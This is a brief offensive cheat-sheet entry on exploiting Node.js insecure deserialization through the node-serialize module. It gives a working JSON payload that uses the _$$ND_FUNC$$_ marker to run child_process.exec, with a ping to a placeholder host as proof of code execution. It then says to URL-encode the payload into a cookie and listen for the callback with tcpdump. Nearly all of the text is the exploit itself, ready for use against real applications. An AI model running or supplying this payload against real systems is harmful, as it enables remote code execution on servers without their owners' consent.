## Node
Check for modules such as `node-serialize`
**Payload:**
```json
{
    "rce":"_$$ND_FUNC$$_function(){require('child_process').exec('ping -c 1 ${T}', function(error, stdout, stderr){console.log(stdout)});}()"
}
```
Then urlendcode and place in cookie 
**Listener:**
`sudo tcpdump -ni tun0 icmp` - listens for ping